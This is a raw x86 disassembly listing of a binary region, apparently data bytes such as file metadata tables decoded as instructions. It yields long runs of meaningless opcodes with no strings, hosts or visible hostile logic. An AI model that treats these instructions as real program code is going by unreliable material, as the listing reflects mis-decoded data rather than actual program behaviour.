  408027:	03 dc                	add    %esp,%ebx
  408029:	1a e1                	sbb    %cl,%ah
  40802b:	01 31                	add    %esi,(%ecx)
  40802d:	01 e2                	add    %esp,%edx
  40802f:	1a 06                	sbb    (%esi),%al
  408031:	05 d9 03 eb 1a       	add    $0x1aeb03d9,%eax
  408036:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  408037:	08 d9                	or     %bl,%cl
  408039:	03 90 0d 1b 06 39    	add    0x39061b0d(%eax),%edx
  40803f:	04 13                	add    $0x13,%al
  408041:	1b ac 08 39 04 9c 0b 	sbb    0xb9c0439(%eax,%ecx,1),%ebp
  408048:	b3 08                	mov    $0x8,%bl
  40804a:	49                   	dec    %ecx
  40804b:	04 2a                	add    $0x2a,%al
  40804d:	1b ca                	sbb    %edx,%ecx
  40804f:	08 49 04             	or     %cl,0x4(%ecx)
  408052:	33 1b                	xor    (%ebx),%ebx
  408054:	d0 08                	rorb   $1,(%eax)
  408056:	31 00                	xor    %eax,(%eax)
  408058:	eb 04                	jmp    0x40805e
  40805a:	d6                   	salc
  40805b:	08 51 04             	or     %dl,0x4(%ecx)
  40805e:	4a                   	dec    %edx
  40805f:	01 ee                	add    %ebp,%esi
  408061:	08 89 01 9c 0f e5    	or     %cl,-0x1af063ff(%ecx)
  408067:	00 71 04             	add    %dh,0x4(%ecx)
  40806a:	8a 1b                	mov    (%ebx),%bl
  40806c:	f7 08 b1 01 96 1b    	testl  $0x1b9601b1,(%eax)
  408072:	fc                   	cld
  408073:	08 61 01             	or     %ah,0x1(%ecx)
  408076:	a2 1b b0 03 61       	mov    %al,0x6103b01b
  40807b:	04 b5                	add    $0xb5,%al
  40807d:	1b 02                	sbb    (%edx),%eax
  40807f:	09 61 04             	or     %esp,0x4(%ecx)
  408082:	bf 1b 2a 05 61       	mov    $0x61052a1b,%edi
  408087:	04 d5                	add    $0xd5,%al
  408089:	1b 09                	sbb    (%ecx),%ecx
  40808b:	09 61 04             	or     %esp,0x4(%ecx)
  40808e:	53                   	push   %ebx
  40808f:	19 71 00             	sbb    %esi,0x0(%ecx)
  408092:	81 01 e3 1b 0f 09    	addl   $0x90f1be3,(%ecx)
  408098:	99                   	cltd
  408099:	01 ec                	add    %ebp,%esp
  40809b:	1b d5                	sbb    %ebp,%edx
  40809d:	00 69 04             	add    %ch,0x4(%ecx)
  4080a0:	4a                   	dec    %edx
  4080a1:	01 bd 02 81 04 07    	add    %edi,0x7048102(%ebp)
  4080a7:	1c bd                	sbb    $0xbd,%al
  4080a9:	02 69 03             	add    0x3(%ecx),%ch
  4080ac:	11 1c d5 00 69 03 21 	adc    %ebx,0x21036900(,%edx,8)
  4080b3:	1c d5                	sbb    $0xd5,%al
  4080b5:	00 61 01             	add    %ah,0x1(%ecx)
  4080b8:	34 1c                	xor    $0x1c,%al
  4080ba:	b0 03                	mov    $0x3,%al
  4080bc:	61                   	popa
  4080bd:	01 44 1c b0          	add    %eax,-0x50(%esp,%ebx,1)
  4080c1:	03 59 00             	add    0x0(%ecx),%ebx
  4080c4:	4a                   	dec    %edx
  4080c5:	01 4e 09             	add    %ecx,0x9(%esi)
  4080c8:	b1 01                	mov    $0x1,%cl
  4080ca:	ba 0a 1b 06 89       	mov    $0x89061b0a,%edx
  4080cf:	01 67 1c             	add    %esp,0x1c(%edi)
  4080d2:	56                   	push   %esi
  4080d3:	09 81 01 e3 1b 5e    	or     %eax,0x5e1be301(%ecx)
  4080d9:	09 99 01 75 1c 14    	or     %ebx,0x141c7501(%ecx)
  4080df:	02 51 01             	add    0x1(%ecx),%dl
  4080e2:	53                   	push   %ebx
  4080e3:	19 71 00             	sbb    %esi,0x0(%ecx)
  4080e6:	91                   	xchg   %eax,%ecx
  4080e7:	04 94                	add    $0x94,%al
  4080e9:	1c 64                	sbb    $0x64,%al
  4080eb:	09 59 03             	or     %ebx,0x3(%ecx)
  4080ee:	9b                   	fwait
  4080ef:	1c 6c                	sbb    $0x6c,%al
  4080f1:	09 11                	or     %edx,(%ecx)
  4080f3:	02 a1 1c 75 09 11    	add    0x1109751c(%ecx),%ah
  4080f9:	02 b4 1c 08 03 21 01 	add    0x1210308(%esp,%ebx,1),%dh
  408100:	e1 0f                	loope  0x408111
  408102:	7c 09                	jl     0x40810d
  408104:	81 01 be 1c 5e 09    	addl   $0x95e1cbe,(%ecx)
  40810a:	59                   	pop    %ecx
  40810b:	03 d8                	add    %eax,%ebx
  40810d:	13 81 09 79 01 4a    	adc    0x4a017909(%ecx),%eax
  408113:	01 bd 02 79 01 53    	add    %edi,0x53017902(%ebp)
  408119:	19 71 00             	sbb    %esi,0x0(%ecx)
  40811c:	71 01                	jno    0x40811f
  40811e:	cd 1c                	int    $0x1c
  408120:	8d 09                	lea    (%ecx),%ecx
  408122:	21 02                	and    %eax,(%edx)
  408124:	e0 1c                	loopne 0x408142
  408126:	09 01                	or     %eax,(%ecx)
  408128:	69 03 e5 1c 17 00    	imul   $0x171ce5,(%ebx),%eax
  40812e:	59                   	pop    %ecx
  40812f:	01 e9                	add    %ebp,%ecx
  408131:	1c 71                	sbb    $0x71,%al
  408133:	00 21                	add    %ah,(%ecx)
  408135:	02 f9                	add    %cl,%bh
  408137:	1c c2                	sbb    $0xc2,%al
  408139:	09 21                	or     %esp,(%ecx)
  40813b:	02 05 1d c7 09 a1    	add    0xa109c71d,%al
  408141:	04 19                	add    $0x19,%al
  408143:	1d cd 09 21 01       	sbb    $0x12109cd,%eax
  408148:	23 1d d2 09 21 01    	and    0x12109d2,%ebx
  40814e:	2a 0e                	sub    (%esi),%cl
  408150:	d7                   	xlat   %ds:(%ebx)
  408151:	09 a9 00 61 02 71    	or     %ebp,0x71026100(%ecx)
  408157:	00 69 04             	add    %ch,0x4(%ecx)
  40815a:	4a                   	dec    %edx
  40815b:	01 fc                	add    %edi,%esp
  40815d:	08 19                	or     %bl,(%ecx)
  40815f:	00 3f                	add    %bh,(%edi)
  408161:	02 dc                	add    %ah,%bl
  408163:	09 81 04 e9 15 22    	or     %eax,0x2215e904(%ecx)
  408169:	07                   	pop    %es
  40816a:	69 01 33 1d d5 00    	imul   $0xd51d33,(%ecx),%eax
  408170:	59                   	pop    %ecx
  408171:	01 46 1d             	add    %eax,0x1d(%esi)
  408174:	f8                   	clc
  408175:	09 31                	or     %esi,(%ecx)
  408177:	01 55 1d             	add    %edx,0x1d(%ebp)
  40817a:	9f                   	lahf
  40817b:	01 b9 04 4a 01 13    	add    %edi,0x13014a04(%ecx)
  408181:	00 c1                	add    %al,%cl
  408183:	04 4a                	add    $0x4a,%al
  408185:	01 2b                	add    %ebp,(%ebx)
  408187:	02 c9                	add    %cl,%cl
  408189:	04 a7                	add    $0xa7,%al
  40818b:	1d 0c 0a 59 01       	sbb    $0x1590a0c,%eax
  408190:	b9 1d 17 00 d1       	mov    $0xd100171d,%ecx
  408195:	04 4a                	add    $0x4a,%al
  408197:	01 13                	add    %edx,(%ebx)
  408199:	00 e1                	add    %ah,%cl
  40819b:	04 4a                	add    $0x4a,%al
  40819d:	01 13                	add    %edx,(%ebx)
  40819f:	00 e9                	add    %ch,%cl
  4081a1:	04 4f                	add    $0x4f,%al
  4081a3:	1e                   	push   %ds
  4081a4:	1c 0a                	sbb    $0xa,%al
  4081a6:	99                   	cltd
  4081a7:	04 5b                	add    $0x5b,%al
  4081a9:	1e                   	push   %ds
  4081aa:	23 0a                	and    (%edx),%ecx
  4081ac:	f1                   	int1
  4081ad:	04 73                	add    $0x73,%al
  4081af:	1e                   	push   %ds
  4081b0:	30 0a                	xor    %cl,(%edx)
  4081b2:	f1                   	int1
  4081b3:	04 86                	add    $0x86,%al
  4081b5:	1e                   	push   %ds
  4081b6:	36 0a f1             	ss or  %cl,%dh
  4081b9:	04 8f                	add    $0x8f,%al
  4081bb:	1e                   	push   %ds
  4081bc:	3d 0a d9 04 9f       	cmp    $0x9f04d90a,%eax
  4081c1:	1e                   	push   %ds
  4081c2:	43                   	inc    %ebx
  4081c3:	0a e1                	or     %cl,%ah
  4081c5:	01 b3 1e 71 00 81    	add    %esi,-0x7eff8ee2(%ebx)
  4081cb:	00 4a 01             	add    %cl,0x1(%edx)
  4081ce:	60                   	pusha
  4081cf:	0a 01                	or     (%ecx),%al
  4081d1:	05 d4 1e 6a 0a       	add    $0xa6a1ed4,%eax
  4081d6:	61                   	popa
  4081d7:	00 4a 01             	add    %cl,0x1(%edx)
  4081da:	89 05 31 01 e2 1e    	mov    %eax,0x1ee20131
  4081e0:	71 0a                	jno    0x4081ec
  4081e2:	61                   	popa
  4081e3:	00 1d 15 76 0a a1    	add    %bl,0xa10a7615
  4081e9:	04 ec                	add    $0xec,%al
  4081eb:	1e                   	push   %ds
  4081ec:	84 0a                	test   %cl,(%edx)
  4081ee:	69 01 f3 1e f1 01    	imul   $0x1f11ef3,(%ecx),%eax
  4081f4:	81 00 e9 19 90 0a    	addl   $0xa9019e9,(%eax)
  4081fa:	49                   	dec    %ecx
  4081fb:	04 01                	add    $0x1,%al
  4081fd:	1f                   	pop    %ds
  4081fe:	a8 0a                	test   $0xa,%al
  408200:	69 01 0b 1f f1 01    	imul   $0x1f11f0b,(%ecx),%eax
  408206:	69 01 1e 1f d5 00    	imul   $0xd51f1e,(%ecx),%eax
  40820c:	99                   	cltd
  40820d:	01 32                	add    %esi,(%edx)
  40820f:	1f                   	pop    %ds
  408210:	14 02                	adc    $0x2,%al
  408212:	61                   	popa
  408213:	04 4a                	add    $0x4a,%al
  408215:	01 bd 02 61 04 3e    	add    %edi,0x3e046102(%ebp)
  40821b:	1f                   	pop    %ds
  40821c:	a1 06 49 04 52       	mov    0x52044906,%eax
  408221:	1f                   	pop    %ds
  408222:	ca 08 79             	lret   $0x7908
  408225:	02 61 02             	add    0x2(%ecx),%ah
  408228:	01 05 31 01 5c 1f    	add    %eax,0x1f5c0131
  40822e:	71 00                	jno    0x408230
  408230:	b1 01                	mov    $0x1,%cl
  408232:	7f 1f                	jg     0x408253
  408234:	c3                   	ret
  408235:	0a b1 01 ab 0a cd    	or     -0x32f554ff(%ecx),%dh
  40823b:	0a b1 01 7f 1f e0    	or     -0x1fe080ff(%ecx),%dh
  408241:	0a 39                	or     (%ecx),%bh
  408243:	00 4a 01             	add    %cl,0x1(%edx)
  408246:	30 0a                	xor    %cl,(%edx)
  408248:	29 05 a9 12 f3 0a    	sub    %eax,0xaf312a9
  40824e:	31 05 4a 01 fa 0a    	xor    %eax,0xafa014a
  408254:	11 02                	adc    %eax,(%edx)
  408256:	dc 1f                	fcompl (%edi)
  408258:	45                   	inc    %ebp
  408259:	06                   	push   %es
  40825a:	29 05 33 1b 15 0b    	sub    %eax,0xb151b33
  408260:	f1                   	int1
  408261:	04 eb                	add    $0xeb,%al
  408263:	1f                   	pop    %ds
  408264:	3d 0a 89 00 4a       	cmp    $0x4a00890a,%eax
  408269:	01 3c 0b             	add    %edi,(%ebx,%ecx,1)
  40826c:	29 02                	sub    %eax,(%edx)
  40826e:	5e                   	pop    %esi
  40826f:	16                   	push   %ss
  408270:	13 00                	adc    (%eax),%eax
  408272:	41                   	inc    %ecx
  408273:	05 4a 01 44 0b       	add    $0xb44014a,%eax
  408278:	51                   	push   %ecx
  408279:	05 4a 01 89 05       	add    $0x589014a,%eax
  40827e:	59                   	pop    %ecx
  40827f:	05 4a 01 13 00       	add    $0x13014a,%eax
  408284:	61                   	popa
  408285:	05 4a 01 bd 02       	add    $0x2bd014a,%eax
  40828a:	69 05 4a 01 bd 02 71 	imul   $0x14a0571,0x2bd014a,%eax
  408291:	05 4a 01 
  408294:	bd 02 79 05 4a       	mov    $0x4a057902,%ebp
  408299:	01 bd 02 81 05 4a    	add    %edi,0x4a058102(%ebp)
  40829f:	01 bd 02 89 05 4a    	add    %edi,0x4a058902(%ebp)
  4082a5:	01 bd 02 91 05 4a    	add    %edi,0x4a059102(%ebp)
  4082ab:	01 bd 02 99 05 4a    	add    %edi,0x4a059902(%ebp)
  4082b1:	01 bd 02 08 00 90    	add    %edi,-0x6ffff7fe(%ebp)
  4082b7:	00 3e                	add    %bh,(%esi)
  4082b9:	01 0e                	add    %ecx,(%esi)
  4082bb:	00 a8 00 a8 01 09    	add    %ch,0x901a800(%eax)
  4082c1:	00 e0                	add    %ah,%al
  4082c3:	00 50 02             	add    %dl,0x2(%eax)
  4082c6:	09 00                	or     %eax,(%eax)
  4082c8:	e4 00                	in     $0x0,%al
  4082ca:	55                   	push   %ebp
  4082cb:	02 09                	add    (%ecx),%cl
  4082cd:	00 e8                	add    %ch,%al
  4082cf:	00 5a 02             	add    %bl,0x2(%edx)
  4082d2:	29 00                	sub    %eax,(%eax)
  4082d4:	83 00 e3             	addl   $0xffffffe3,(%eax)
  4082d7:	02 2e                	add    (%esi),%ch
  4082d9:	00 cb                	add    %cl,%bl
  4082db:	0a b5 03 2e 00 c3    	or     -0x3cffd1fd(%ebp),%dh
  4082e1:	0a b5 03 2e 00 93    	or     -0x6cffd1fd(%ebp),%dh
  4082e7:	0a 56 0b             	or     0xb(%esi),%dl
  4082ea:	2e 00 9b 0a 75 0b 2e 	add    %bl,%cs:0x2e0b750a(%ebx)
  4082f1:	00 bb 0a b5 03 2e    	add    %bh,0x2e03b50a(%ebx)
  4082f7:	00 8b 0a 4d 0b 2e    	add    %cl,0x2e0b4d0a(%ebx)
  4082fd:	00 d3                	add    %dl,%bl
  4082ff:	0a b5 03 2e 00 a3    	or     -0x5cffd1fd(%ebp),%dh
  408305:	0a 9f 0b 2e 00 ab    	or     -0x54ffd1f5(%edi),%bl
  40830b:	0a b5 03 2e 00 b3    	or     -0x4cffd1fd(%ebp),%dh
  408311:	0a b5 03 40 00 2b    	or     0x2b004003(%ebp),%dh
  408317:	00 5a 02             	add    %bl,0x2(%edx)
  40831a:	40                   	inc    %eax
  40831b:	00 13                	add    %dl,(%ebx)
  40831d:	00 65 02             	add    %ah,0x2(%ebp)
  408320:	43                   	inc    %ebx
  408321:	00 13                	add    %dl,(%ebx)
  408323:	00 65 02             	add    %ah,0x2(%ebp)
  408326:	43                   	inc    %ebx
  408327:	00 1b                	add    %bl,(%ebx)
  408329:	00 74 02 49          	add    %dh,0x49(%edx,%eax,1)
  40832d:	00 83 00 f4 02 63    	add    %al,0x6302f400(%ebx)
  408333:	00 13                	add    %dl,(%ebx)
  408335:	00 65 02             	add    %ah,0x2(%ebp)
  408338:	63 00                	arpl   %eax,(%eax)
  40833a:	1b 00                	sbb    (%eax),%eax
  40833c:	74 02                	je     0x408340
  40833e:	69 00 83 00 c2 02    	imul   $0x2c20083,(%eax),%eax
  408344:	80 00 2b             	addb   $0x2b,(%eax)
  408347:	00 5a 02             	add    %bl,0x2(%edx)
  40834a:	83 00 73             	addl   $0x73,(%eax)
  40834d:	00 5a 02             	add    %bl,0x2(%edx)
  408350:	83 00 7b             	addl   $0x7b,(%eax)
  408353:	00 5a 02             	add    %bl,0x2(%edx)
  408356:	83 00 1b             	addl   $0x1b,(%eax)
  408359:	00 74 02 89          	add    %dh,-0x77(%edx,%eax,1)
  40835d:	00 83 00 cf 02 a0    	add    %al,-0x5ffd3100(%ebx)
  408363:	00 2b                	add    %ch,(%ebx)
  408365:	00 5a 02             	add    %bl,0x2(%edx)
  408368:	a1 00 db 00 5a       	mov    0x5a00db00,%eax
  40836d:	02 a1 00 e3 00 5a    	add    0x5a00e300(%ecx),%ah
  408373:	02 a3 00 13 00 65    	add    0x65001300(%ebx),%ah
  408379:	02 a3 00 c3 00 3d    	add    0x3d00c300(%ebx),%ah
  40837f:	03 c0                	add    %eax,%eax
  408381:	00 2b                	add    %ch,(%ebx)
  408383:	00 5a 02             	add    %bl,0x2(%edx)
  408386:	c3                   	ret
  408387:	00 13                	add    %dl,(%ebx)
  408389:	00 65 02             	add    %ah,0x2(%ebp)
  40838c:	c3                   	ret
  40838d:	00 d3                	add    %dl,%bl
  40838f:	00 b5 03 e0 00 2b    	add    %dh,0x2b00e003(%ebp)
  408395:	00 5a 02             	add    %bl,0x2(%edx)
  408398:	00 01                	add    %al,(%ecx)
  40839a:	13 00                	adc    (%eax),%eax
  40839c:	65 02 00             	add    %gs:(%eax),%al
  40839f:	01 2b                	add    %ebp,(%ebx)
  4083a1:	00 5a 02             	add    %bl,0x2(%edx)
  4083a4:	20 01                	and    %al,(%ecx)
  4083a6:	2b 00                	sub    (%eax),%eax
  4083a8:	5a                   	pop    %edx
  4083a9:	02 20                	add    (%eax),%ah
  4083ab:	01 13                	add    %edx,(%ebx)
  4083ad:	00 65 02             	add    %ah,0x2(%ebp)
  4083b0:	40                   	inc    %eax
  4083b1:	01 2b                	add    %ebp,(%ebx)
  4083b3:	00 5a 02             	add    %bl,0x2(%edx)
  4083b6:	40                   	inc    %eax
  4083b7:	01 13                	add    %edx,(%ebx)
  4083b9:	00 65 02             	add    %ah,0x2(%ebp)
  4083bc:	60                   	pusha
  4083bd:	01 13                	add    %edx,(%ebx)
  4083bf:	00 65 02             	add    %ah,0x2(%ebp)
  4083c2:	60                   	pusha
  4083c3:	01 2b                	add    %ebp,(%ebx)
  4083c5:	00 5a 02             	add    %bl,0x2(%edx)
  4083c8:	80 01 2b             	addb   $0x2b,(%ecx)
  4083cb:	00 5a 02             	add    %bl,0x2(%edx)
  4083ce:	a0 01 2b 00 5a       	mov    0x5a002b01,%al
  4083d3:	02 c0                	add    %al,%al
  4083d5:	01 2b                	add    %ebp,(%ebx)
  4083d7:	00 5a 02             	add    %bl,0x2(%edx)
  4083da:	c0 01 13             	rolb   $0x13,(%ecx)
  4083dd:	00 65 02             	add    %ah,0x2(%ebp)
  4083e0:	e0 01                	loopne 0x4083e3
  4083e2:	2b 00                	sub    (%eax),%eax
  4083e4:	5a                   	pop    %edx
  4083e5:	02 00                	add    (%eax),%al
  4083e7:	02 2b                	add    (%ebx),%ch
  4083e9:	00 5a 02             	add    %bl,0x2(%edx)
  4083ec:	00 02                	add    %al,(%edx)
  4083ee:	13 00                	adc    (%eax),%eax
  4083f0:	65 02 03             	add    %gs:(%ebx),%al
  4083f3:	02 73 00             	add    0x0(%ebx),%dh
  4083f6:	5a                   	pop    %edx
  4083f7:	02 80 02 23 03 5a    	add    0x5a032302(%eax),%al
  4083fd:	02 83 02 e3 00 5a    	add    0x5a00e302(%ebx),%al
  408403:	02 83 02 03 01 d4    	add    -0x2bfefcfe(%ebx),%al
  408409:	03 a3 02 e3 00 5a    	add    0x5a00e302(%ebx),%esp
  40840f:	02 c0                	add    %al,%al
  408411:	03 e3                	add    %ebx,%esp
  408413:	00 5a 02             	add    %bl,0x2(%edx)
  408416:	e0 03                	loopne 0x40841b
  408418:	e3 00                	jecxz  0x40841a
  40841a:	5a                   	pop    %edx
  40841b:	02 e0                	add    %al,%ah
  40841d:	03 0b                	add    (%ebx),%ecx
  40841f:	01 5a 02             	add    %ebx,0x2(%edx)
  408422:	00 04 e3             	add    %al,(%ebx,%eiz,8)
  408425:	00 5a 02             	add    %bl,0x2(%edx)
  408428:	80 06 0b             	addb   $0xb,(%esi)
  40842b:	01 5a 02             	add    %ebx,0x2(%edx)
  40842e:	80 06 e3             	addb   $0xe3,(%esi)
  408431:	00 5a 02             	add    %bl,0x2(%edx)
  408434:	a0 06 e3 00 5a       	mov    0x5a00e306,%al
  408439:	02 a0 06 0b 01 5a    	add    0x5a010b06(%eax),%ah
  40843f:	02 60 08             	add    0x8(%eax),%ah
  408442:	e3 00                	jecxz  0x408444
  408444:	5a                   	pop    %edx
  408445:	02 60 08             	add    0x8(%eax),%ah
  408448:	0b 01                	or     (%ecx),%eax
  40844a:	5a                   	pop    %edx
  40844b:	02 80 08 0b 01 5a    	add    0x5a010b08(%eax),%al
  408451:	02 80 08 e3 00 5a    	add    0x5a00e308(%eax),%al
  408457:	02 a0 10 e3 00 5a    	add    0x5a00e310(%eax),%ah
  40845d:	02 41 00             	add    0x0(%ecx),%al
  408460:	f5                   	cmc
  408461:	08 45 00             	or     %al,0x0(%ebp)
  408464:	f5                   	cmc
  408465:	08 6a 00             	or     %ch,0x0(%edx)
  408468:	4b                   	dec    %ebx
  408469:	0b 6c 00 4b          	or     0x4b(%eax,%eax,1),%ebp
  40846d:	0b 87 00 0a 0a 93    	or     -0x6cf5f600(%edi),%eax
  408473:	00 1a                	add    %bl,(%edx)
  408475:	0a 95 00 1a 0a 97    	or     -0x68f5e600(%ebp),%dl
  40847b:	00 1a                	add    %bl,(%edx)
  40847d:	0a a9 02 ae 02 b3    	or     -0x4cfd51fe(%ecx),%ch
  408483:	02 b8 02 0d 03 11    	add    0x11030d02(%eax),%bh
  408489:	03 1c 03             	add    (%ebx,%eax,1),%ebx
  40848c:	21 03                	and    %eax,(%ebx)
  40848e:	30 03                	xor    %al,(%ebx)
  408490:	30 03                	xor    %al,(%ebx)
  408492:	ab                   	stos   %eax,%es:(%edi)
  408493:	03 ba 04 f6 04 0b    	add    0xb04f604(%edx),%edi
  408499:	05 0d 03 2e 05       	add    $0x52e030d,%eax
  40849e:	41                   	inc    %ecx
  40849f:	05 46 05 65 05       	add    $0x5650546,%eax
  4084a4:	ad                   	lods   %ds:(%esi),%eax
  4084a5:	05 c9 05 d9 05       	add    $0x5d905c9,%eax
  4084aa:	e6 05                	out    %al,$0x5
  4084ac:	01 06                	add    %eax,(%esi)
  4084ae:	2c 06                	sub    $0x6,%al
  4084b0:	4b                   	dec    %ebx
  4084b1:	06                   	push   %es
  4084b2:	5c                   	pop    %esp
  4084b3:	06                   	push   %es
  4084b4:	7a 06                	jp     0x4084bc
  4084b6:	ac                   	lods   %ds:(%esi),%al
  4084b7:	06                   	push   %es
  4084b8:	b6 06                	mov    $0x6,%dh
  4084ba:	cb                   	lret
  4084bb:	06                   	push   %es
  4084bc:	b6 06                	mov    $0x6,%dh
  4084be:	d9 06                	flds   (%esi)
  4084c0:	e8 06 87 07 ed       	call   0xed480bcb
  4084c5:	07                   	pop    %es
  4084c6:	b6 06                	mov    $0x6,%dh
  4084c8:	b6 06                	mov    $0x6,%dh
  4084ca:	17                   	pop    %ss
  4084cb:	08 60 08             	or     %ah,0x8(%eax)
  4084ce:	83 08 8c             	orl    $0xffffff8c,(%eax)
  4084d1:	08 96 08 ba 08 e1    	or     %dl,-0x1ef745f8(%esi)
  4084d7:	08 16                	or     %dl,(%esi)
  4084d9:	09 b6 06 b6 06 94    	or     %esi,-0x6bf949fa(%esi)
  4084df:	09 bb 09 e2 09 ee    	or     %edi,-0x11f61df7(%ebx)
  4084e5:	09 ff                	or     %edi,%edi
  4084e7:	09 13                	or     %edx,(%ebx)
  4084e9:	0a 13                	or     (%ebx),%dl
  4084eb:	0a 4c 0a 65          	or     0x65(%edx,%ecx,1),%cl
  4084ef:	0a 0d 03 7c 0a 11    	or     0x110a7c03,%cl
  4084f5:	03 97 0a 9c 00 9c    	add    -0x63ff63f6(%edi),%edx
  4084fb:	0a a3 0a 21 03 ae    	or     -0x51fcdef6(%ebx),%ah
  408501:	0a b4 0a d6 0a e7 0a 	or     0xae70ad6(%edx,%ecx,1),%dh
  408508:	04 0b                	add    $0xb,%al
  40850a:	1b 0b                	sbb    (%ebx),%ecx
  40850c:	29 0b                	sub    %ecx,(%ebx)
  40850e:	29 0b                	sub    %ecx,(%ebx)
  408510:	41                   	inc    %ecx
  408511:	05 04 00 01 00       	add    $0x10004,%eax
  408516:	06                   	push   %es
  408517:	00 05 00 00 00 6e    	add    %al,0x6e000000
  40851d:	01 4f 00             	add    %ecx,0x0(%edi)
  408520:	00 00                	add    %al,(%eax)
  408522:	27                   	daa
  408523:	02 54 00 00          	add    0x0(%eax,%eax,1),%dl
  408527:	00 d6                	add    %dl,%dh
  408529:	01 59 00             	add    %ebx,0x0(%ecx)
  40852c:	00 00                	add    %al,(%eax)
  40852e:	33 02                	xor    (%edx),%eax
  408530:	5e                   	pop    %esi
  408531:	00 00                	add    %al,(%eax)
  408533:	00 c0                	add    %al,%al
  408535:	02 94 00 02 00 04 00 	add    0x40002(%eax,%eax,1),%dl
  40853c:	03 00                	add    (%eax),%eax
  40853e:	02 00                	add    (%eax),%al
  408540:	05 00 05 00 02       	add    $0x2000500,%eax
  408545:	00 06                	add    %al,(%esi)
  408547:	00 07                	add    %al,(%edi)
  408549:	00 02                	add    %al,(%edx)
  40854b:	00 07                	add    %al,(%edi)
  40854d:	00 09                	add    %cl,(%ecx)
  40854f:	00 02                	add    %al,(%edx)
  408551:	00 0f                	add    %cl,(%edi)
  408553:	00 0b                	add    %cl,(%ebx)
  408555:	00 ef                	add    %ch,%bh
  408557:	12 3c 1b             	adc    (%ebx,%ebx,1),%bh
  40855a:	68 1d c8 1d fb       	push   $0xfb1dc81d
  40855f:	1f                   	pop    %ds
  408560:	75 00                	jne    0x408562
  408562:	75 00                	jne    0x408564
  408564:	88 00                	mov    %al,(%eax)
  408566:	8d 02                	lea    (%edx),%eax
  408568:	94                   	xchg   %eax,%esp
  408569:	02 9b 02 a2 02 9f    	add    -0x60fd5dfe(%ebx),%bl
  40856f:	03 f0                	add    %eax,%esi
  408571:	06                   	push   %es
  408572:	2c 08                	sub    $0x8,%al
  408574:	40                   	inc    %eax
  408575:	08 00                	or     %al,(%eax)
  408577:	01 39                	add    %edi,(%ecx)
  408579:	00 75 03             	add    %dh,0x3(%ebp)
  40857c:	01 00                	add    %eax,(%eax)
  40857e:	41                   	inc    %ecx
  40857f:	01 3b                	add    %edi,(%ebx)
  408581:	00 92 03 01 00 00    	add    %dl,0x103(%edx)
  408587:	01 7d 00             	add    %edi,0x0(%ebp)
  40858a:	86 05 02 00 43 01    	xchg   %al,0x1430002
  408590:	7f 00                	jg     0x408592
  408592:	de 05 02 00 46 01    	fiadds 0x1460002
  408598:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408599:	00 06                	add    %al,(%esi)
  40859b:	07                   	pop    %es
  40859c:	03 00                	add    (%eax),%eax
  40859e:	46                   	inc    %esi
  40859f:	01 a7 00 33 07 03    	add    %esp,0x3073300(%edi)
  4085a5:	00 46 01             	add    %al,0x1(%esi)
  4085a8:	a9 00 4b 07 03       	test   $0x3074b00,%eax
  4085ad:	00 46 01             	add    %al,0x1(%esi)
  4085b0:	ab                   	stos   %eax,%es:(%edi)
  4085b1:	00 75 03             	add    %dh,0x3(%ebp)
  4085b4:	01 00                	add    %eax,(%eax)
  4085b6:	00 01                	add    %al,(%ecx)
  4085b8:	ad                   	lods   %ds:(%esi),%eax
  4085b9:	00 67 07             	add    %ah,0x7(%edi)
  4085bc:	03 00                	add    (%eax),%eax
  4085be:	40                   	inc    %eax
  4085bf:	01 af 00 7b 07 03    	add    %ebp,0x3077b00(%edi)
  4085c5:	00 07                	add    %al,(%edi)
  4085c7:	01 b1 00 a7 07 03    	add    %esi,0x307a700(%ecx)
  4085cd:	00 40 01             	add    %al,0x1(%eax)
  4085d0:	b3 00                	mov    $0x0,%bl
  4085d2:	bb 07 03 00 00       	mov    $0x307,%ebx
  4085d7:	01 b5 00 d7 07 03    	add    %esi,0x307d700(%ebp)
  4085dd:	00 00                	add    %al,(%eax)
  4085df:	01 b7 00 0c 08 03    	add    %esi,0x3080c00(%edi)
  4085e5:	00 00                	add    %al,(%eax)
  4085e7:	01 b9 00 49 08 03    	add    %edi,0x3084900(%ecx)
  4085ed:	00 40 01             	add    %al,0x1(%eax)
  4085f0:	bd 00 d2 1d 04       	mov    $0x41dd200,%ebp
  4085f5:	00 40 01             	add    %al,0x1(%eax)
  4085f8:	cb                   	lret
  4085f9:	00 4a 09             	add    %cl,0x9(%edx)
  4085fc:	05 00 00 01 d1       	add    $0xd1010000,%eax
  408601:	00 ca                	add    %cl,%dl
  408603:	09 03                	or     %eax,(%ebx)
  408605:	00 00                	add    %al,(%eax)
  408607:	01 d7                	add    %edx,%edi
  408609:	00 67 07             	add    %ah,0x7(%edi)
  40860c:	03 00                	add    (%eax),%eax
  40860e:	00 01                	add    %al,(%ecx)
  408610:	d9 00                	flds   (%eax)
  408612:	47                   	inc    %edi
  408613:	0a 03                	or     (%ebx),%al
  408615:	00 40 01             	add    %al,0x1(%eax)
  408618:	db 00                	fildl  (%eax)
  40861a:	60                   	pusha
  40861b:	0a 01                	or     (%ecx),%al
  40861d:	00 04 80             	add    %al,(%eax,%eax,4)
  408620:	00 00                	add    %al,(%eax)
  408622:	01 00                	add    %eax,(%eax)
	...
  408630:	2c 21                	sub    $0x21,%al
  408632:	00 00                	add    %al,(%eax)
  408634:	04 00                	add    $0x0,%al
	...
  40863e:	00 00                	add    %al,(%eax)
  408640:	01 00                	add    %eax,(%eax)
  408642:	0a 00                	or     (%eax),%al
  408644:	00 00                	add    %al,(%eax)
  408646:	00 00                	add    %al,(%eax)
  408648:	0a 00                	or     (%eax),%al
	...
  408652:	00 00                	add    %al,(%eax)
  408654:	0a 00                	or     (%eax),%al
  408656:	13 00                	adc    (%eax),%eax
  408658:	00 00                	add    %al,(%eax)
  40865a:	00 00                	add    %al,(%eax)
  40865c:	04 00                	add    $0x0,%al
	...
  408666:	00 00                	add    %al,(%eax)
  408668:	01 00                	add    %eax,(%eax)
  40866a:	77 01                	ja     0x40866d
  40866c:	00 00                	add    %al,(%eax)
  40866e:	00 00                	add    %al,(%eax)
  408670:	04 00                	add    $0x0,%al
	...
  40867a:	00 00                	add    %al,(%eax)
  40867c:	0a 00                	or     (%eax),%al
  40867e:	f3 11 00             	repz adc %eax,(%eax)
  408681:	00 00                	add    %al,(%eax)
  408683:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40868e:	00 00                	add    %al,(%eax)
  408690:	0a 00                	or     (%eax),%al
  408692:	be 16 00 00 00       	mov    $0x16,%esi
  408697:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4086a2:	00 00                	add    %al,(%eax)
